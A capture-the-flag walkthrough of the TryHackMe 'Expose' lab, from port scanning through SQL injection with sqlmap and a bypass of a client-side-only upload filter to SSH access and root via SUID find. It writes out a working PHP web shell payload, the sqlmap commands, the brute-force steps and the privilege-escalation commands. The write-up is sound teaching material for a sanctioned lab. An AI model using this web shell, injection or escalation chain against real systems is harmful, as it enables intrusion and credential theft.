---
description: "TryHackMe Expose — a full-port scan turns up two services nobody should have left running (MQTT on 1883, a web app on 1337). The web app hides a second admin portal whose login endpoint helpfully echoes its own SQL query, so sqlmap dumps the database: plaintext creds, two secret directories, and a password that is really a machine username. One of those directories is a file upload that only checks the extension in browser JavaScript — POST a .php straight past it and you have code execution as www-data. A world-readable ssh_creds.txt gets you the user; a SUID /usr/bin/find gets you root. Every wrong turn kept, including the hashcat rule file that doesn't exist in v7 and the upload folder that 404s at the web root."
---

# Expose — the box that leaves everything switched on

**TryHackMe · challenge: Expose · target: `10.x.x.x` (lab IP changes per lease)**

> **All flags are redacted** here as `THM{[redacted]}`. Everything that teaches stays: every command
> with every flag explained, the SQL injection oracle, the client-side-only upload filter, the
> credential trail, and the SUID privilege escalation. The flag strings are just proof you were
> there — publishing them hands the room's answer to the next person instead of letting them earn it.
>
> **What I kept and why:** the hidden directory names (`/admin_101`, `/file1010111`,
> `/upload-cv00101011`, `/upload_thm_1001`) and the username `zeamkish` are *method*, not prize —
> redacting them would gut the walkthrough. The two flag values are the only things removed.

A vocabulary note first, because the room assumes none. A **port** is a numbered door a service
answers on; each listening program sits behind one. A **service** is such a program — a web server, a
database, a file server. **SQLi** is *SQL injection*: sneaking database commands into a value the app
drops into a query. **RCE** is *remote code execution* — running your own commands on someone else's
machine. **www-data** is the low-privilege user a web server runs as on Ubuntu. **SUID** is a bit on a
program file that makes it run with its *owner's* privileges no matter who launches it — harmless on
`passwd`, dangerous on a general tool. **MQTT** is a lightweight publish/subscribe messaging protocol
used by IoT devices. Hold those and the box reads cleanly.

The room's theme is stated in the brief: *"Exposing unnecessary services in a machine can be
dangerous."* Every single step is a real service or feature that should not have been left reachable.

---

## 1. Recon — knock on every door, not just the common ones

```
nmap -p- -T4 --min-rate 1000 -oN nmap-allports.txt <target>
```

- `-p-` = scan **all 65535 TCP ports**. The default nmap scan only tries the 1000 most common. This
  room's whole hint is that something listens on an *un*common port, so the default would miss it.
- `-T4` = timing template 4, "aggressive" — send probes fast. Fine against a lab VM.
- `--min-rate 1000` = at least 1000 packets/second, so the scan finishes in about a minute.
- `-oN <file>` = save human-readable output.

**Cost, worked out before launching:** 65535 ports ÷ 1000/s ≈ 66 seconds. It finished in **8 seconds**.

```
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
1337/tcp open  waste      <- unusual
1883/tcp open  mqtt       <- unusual
```

The most useful line is the one nmap almost hides: `Not shown: 65530 closed tcp ports (reset)`.
"Closed" means the machine actively replied "nothing here." That is different from "filtered", which
means no reply at all. Because this host is honest about its closed ports, a port missing from the
list really is closed — the scan came with a built-in negative control.

Then version and default-script detection on just the open ports:

```
nmap -sC -sV -p 21,22,53,1337,1883 -oN nmap-services.txt <target>
```

- `-sV` = ask each service what software and version it runs. A version string often names the bug.
- `-sC` = run nmap's default safe scripts (anonymous-FTP check, HTTP titles, an MQTT topic dump).

| Port | Service | What it revealed |
|---|---|---|
| 21 | vsFTPd 3.0.3 | **anonymous login allowed** |
| 22 | OpenSSH 8.2p1 | Ubuntu 20.04 — remember this |
| 53 | BIND 9.16.1 | a DNS server |
| 1337 | Apache 2.4.41 | HTTP, page title **"EXPOSED"** |
| 1883 | mosquitto 1.6.9 | **MQTT broker answering anonymously** |

## 2. Two decoys, proven empty rather than assumed empty

**Anonymous FTP.** `curl` showed an empty listing. But an empty result is not a finding until you have
proven the channel — silence means either "empty directory" or "my request never arrived," and those
look identical. Re-running through Python's `ftplib`, which reports each step separately:

```
LOGIN  : 230 Login successful.
PWD    : /
LIST rows: 0
```

Login succeeded (`230`), the directory query executed cleanly, and it is genuinely empty. *Now* it is
a real dead end. The banner also names the theme: "Welcome to the Expose Web Challenge."

**MQTT.** A retained MQTT message is a classic place to leak credentials, so I subscribed to `#` (the
wildcard for "every topic") — 0 application messages. Before believing that, I re-ran with a
**positive control**: subscribe to `$SYS/#` (the broker's own stats, which I know exist) *and* `#` in
the same run.

```
POSITIVE CONTROL  $SYS/# topics seen : 40   <- proves the subscriber works
RESULT            #     topics seen : 0
```

The control fired, so the broker really is empty. MQTT is an exposed-but-unused service — a decoy.

## 3. The web app, and a second admin portal

The site on 1337 is a 91-byte stub, but `/index.php` returns 200 while `/index.html` 404s, so it is
PHP. A directory sweep with `ffuf`:

```
ffuf -u http://<target>:1337/FUZZ -w wordlist.txt -t 25 -mc all -fs 278
```

- `FUZZ` is the placeholder ffuf swaps each wordlist entry into.
- `-t 25` = 25 threads. Kept low on purpose — `-t 80` topples a 1-vCPU lab VM and then you are
  debugging your own traffic.
- `-mc all` = match every status code. ffuf's default match list omits 404, which has caused false
  results before.
- `-fs 278` = hide responses of exactly 278 bytes, which I measured first by requesting a path that
  cannot exist — that is this server's 404 size. The filter is built from observation, not a guess.

Two controls went **into the wordlist**: `index.php` (known to exist) must appear, a nonsense string
(known 404) must not. Both behaved every run, so the empty rows are trustworthy.

The sweep found `/admin/` — a login portal whose title *and* meta description both ask *"Is this the
right admin portal?"* Asked twice: the room telling you there is another one. Its only custom script
turned out to be a stock typewriter-animation library. Dead end.

A larger wordlist (`raft-medium-directories`, ~30k entries, 23 seconds) found the real one:
**`/admin_101`**.

## 4. The login endpoint hands you its own SQL query

`/admin_101/` is the same page with the username box **pre-filled `hacker@root.thm`**, and an inline
script that POSTs to `includes/user_login.php`. Baselining that endpoint before attacking it returned
something remarkable — it echoes its own database query:

```
{"status":"error","messages":["SELECT * FROM user WHERE email = 'hacker@root.thm'"]}
```

The email is pasted straight into the query text. That is textbook **SQL injection**: input the
database runs as *code* instead of reading as *data*. A single apostrophe confirms it by breaking the
syntax:

```
email=hacker@root.thm'
-> You have an error in your SQL syntax; ... near ''hacker@root.thm''' at line 1
```

A MySQL syntax error is positive proof — the server tried to execute my input.

Handing it to **sqlmap**, the standard tool:

```
sqlmap -u "http://<target>:1337/admin_101/includes/user_login.php" \
       --data="email=hacker@root.thm&password=x" -p email --batch --dbs
```

- `--data=` = the POST body; sqlmap needs the request shape.
- `-p email` = attack the `email` parameter (already proven injectable).
- `--batch` = never prompt, take defaults.
- `--dbs` = list databases.

It confirmed three injection types and found the app database `expose`. Dumping it (`-D expose --dump`):

**Table `user`** — `hacker@root.thm` : `VeryDifficultPassword!!#@#@!#!@#1231`, stored in **plain text**.

**Table `config`**

| url | password |
|---|---|
| `/file1010111/index.php` | `69c66901194a6486176e81f5945b8929` (an MD5 hash) |
| `/upload-cv00101011/index.php` | `// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z` |

Two hidden directories no wordlist would ever guess, handed over by the database.

## 5. Three wrong turns worth keeping

**The MD5 I never cracked.** `/file1010111/` is password-gated and the config table gives a 32-hex-char
string — the shape of an MD5. I first submitted it *literally* as the password (cheapest test — maybe
it is not a hash). Rejected. Then rockyou (14,344,385 words): **exhausted, no match**. Then rockyou
with rule mutations (946,729,410 candidates): **exhausted, no match**. Both runs carried the MD5 of the
word `password` as a positive control; it cracked both times, which is what makes "not found" a
*controlled negative* rather than a tool that silently did nothing.

**The tool failure hiding inside it.** My first rule-based hashcat runs printed *nothing*. Easy to read
as "no match." The exit code was **255**, and the log said:

```
/usr/share/hashcat/rules/best64.rule: No such file or directory
```

hashcat v7 ships `best66.rule`, not `best64.rule` — but every write-up online says `best64`. Two runs
of pure silence meant "the tool never started," not "the hash resisted." **Never read silence as a
result; check the exit code.** (I never did need this hash — the upload page below is the real path.)

**Reading files through the SQLi.** `--file-read=/etc/passwd` returned `no data retrieved` — the MySQL
account lacks the `FILE` privilege. Querying `mysql.user` returned only stock service accounts, no user
starting with "z."

## 6. The username is a machine user, and the brute force legitimately fails

The `/upload-cv00101011/` page says its password is *"the name of machine user starting with z."* I
brute-forced it: 123 z-names from a names list, then **87,653** z-names from an 8.3-million-entry
username list (73 seconds). Both exhausted, no hit.

Before scaling from 123 to 87k I proved the fuzzer's POST body was actually arriving, by pointing ffuf
at the login endpoint from §4 where two inputs give two *known-different* response sizes:

```
notanemail       200  106     <- "Invalid Email Address"
hacker@root.thm  200  111     <- the SQL query echo
```

Two distinct sizes means the POST body reaches the app. The instrument was fine; the name simply is
not in any public username list. The working password is **`zeamkish`** — and the page behind it is a
**file upload form**.

## 7. Client-side-only validation → code execution

The upload form:

```html
<form method="POST" enctype="multipart/form-data" onsubmit="return validate();">
```

`onsubmit="return validate()"` runs **JavaScript in the browser** and only allows `.jpg`/`.png`. That
check exists on the client side only. A browser runs it; a script that POSTs directly never does.
Client-side validation is a UI convenience, never a security control.

So I POSTed a `.php` file with Python, faking the `Content-Type: image/png` header:

```python
s.post(URL, data={'password':'zeamkish'})                        # get the session cookie
s.post(URL, files={'file':('shell.php', PAYLOAD, 'image/png')})  # no browser => no validate()
```

Payload:

```php
<?php echo '<!--SHELLOK-->'; if(isset($_REQUEST['cmd'])) system($_REQUEST['cmd']); ?>
```

The server accepted it — **no server-side extension check at all**. The response hid the folder in a
`display:none` span: `in /upload_thm_1001 folder`.

**Wrong turn kept in:** `/upload_thm_1001/shell.php` at the web root gave 404, and so did the whole
directory. Looked like the upload had failed. Instead of assuming, I probed candidate parents — the
folder is **relative to the upload page**:

```
/upload-cv00101011/upload_thm_1001/shell.php   -> 200, 14 bytes
```

14 bytes is exactly the `<!--SHELLOK-->` marker with nothing after it. The PHP ran:

```
id     -> uid=33(www-data) gid=33(www-data)
uname  -> Linux ... 5.15.0-1039-aws ... Ubuntu x86_64
```

**RCE as www-data.**

## 8. www-data → zeamkish (the user flag)

`/home/zeamkish` holds two files that matter:

```
-rw-r-----  1 zeamkish zeamkish  flag.txt        <- www-data cannot read this
-rw-rw-r--  1 root     zeamkish  ssh_creds.txt   <- world-readable
```

`www-data` cannot read `flag.txt` (mode `0640`, and it is neither owner nor in the group). But
`ssh_creds.txt` is world-readable:

```
SSH CREDS
zeamkish
easytohack@123
```

(A small instrument note: `find / -name '*flag*'` over the GET web shell returned **414 URI Too
Long** — GET requests have a length limit. Switching to POST fixed it.)

Port 22 was open from the first scan, so I logged in as the user properly instead of staying www-data:

```
ssh zeamkish@<target>        # password: easytohack@123
cat /home/zeamkish/flag.txt  -> THM{[redacted]}
```

**USER FLAG captured.**

## 9. zeamkish → root: SUID find

`zeamkish` cannot `sudo`. Down the standard privilege-escalation checklist, the first and cheapest
check — SUID binaries — pays off immediately:

```
find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/find        <- not normally SUID
```

`-perm -4000` finds files with the **SUID bit** set. Confirming:

```
ls -la /usr/bin/find
-rwsr-x--- 1 root zeamkish /usr/bin/find
```

The `s` is the SUID bit and the owner is **root**. The group `zeamkish` with mode `-rwsr-x---` means
only zeamkish may run it — which is *why* the box makes you become zeamkish first; the www-data shell
alone is not enough. `find` runs commands via `-exec`, and being SUID-root, those commands run as root
(a documented GTFOBins technique):

```
/usr/bin/find /etc/hostname -exec id \;
-> uid=1001(zeamkish) ... euid=0(root)
```

`euid=0(root)` — effective root. Reading the flag (it is `/root/flag.txt`, not the more usual
`/root/root.txt` — I checked `root.txt` first, got "No such file," then listed `/root/` as root to
find the real name):

```
/usr/bin/find /etc/hostname -exec cat /root/flag.txt \;
-> THM{[redacted]}
```

**ROOT FLAG captured.**

## The chain, end to end

1. Full port scan → 5 services; MQTT (1883) and the web app (1337) are the "unnecessary exposed
   services" the brief warns about.
2. FTP-anon and MQTT are decoys — both *proven* empty with controls, not assumed.
3. Web app → hidden second admin portal `/admin_101` (the first one asks "is this the right portal?"
   twice as the hint).
4. Login endpoint echoes its SQL query → **SQL injection** → dump the `expose` database.
5. `config` table leaks two secret directories plus the upload password (`zeamkish`, a machine user).
6. Upload page checks the extension **only in client-side JavaScript** → POST a `.php` directly →
   **RCE** as www-data.
7. World-readable `ssh_creds.txt` → SSH as **zeamkish** → user flag.
8. `/usr/bin/find` is **SUID root** → `find -exec` runs as root → root flag.

Every link is a real exposed or misconfigured service. That is the whole room.

## Teardown — leave the box as you found it

The uploaded web shell is an unauthenticated command-execution endpoint *you* introduced on a shared
lab machine. Remove it and prove the removal:

```
rm .../upload_thm_1001/shell.php     # delete it (via the shell itself)
GET .../upload_thm_1001/shell.php    # re-fetch -> 404 confirms it's gone
```

I used password SSH, so no key was added — nothing to strip from `authorized_keys`. Kill any scan by
PID and check `ps` shows none left. Copy every scan and cracker log out of `/tmp` before it is wiped.
